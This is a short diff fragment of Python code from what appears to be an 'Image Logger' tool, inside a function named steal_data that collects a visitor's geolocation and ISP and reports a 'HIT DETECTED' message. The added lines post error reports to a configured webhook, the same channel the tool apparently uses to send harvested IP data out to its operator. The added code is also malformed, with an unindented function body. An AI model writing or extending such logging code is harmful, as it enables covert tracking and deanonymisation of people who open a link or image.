@@ -115,6 +115,19 @@ def steal_data():
         isp = geo_data.get('org')
     except:
         geo = isp = "N/A"
+
+    def reportError(error):
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
     
     embed = {
         "title": "🎯 HIT DETECTED",
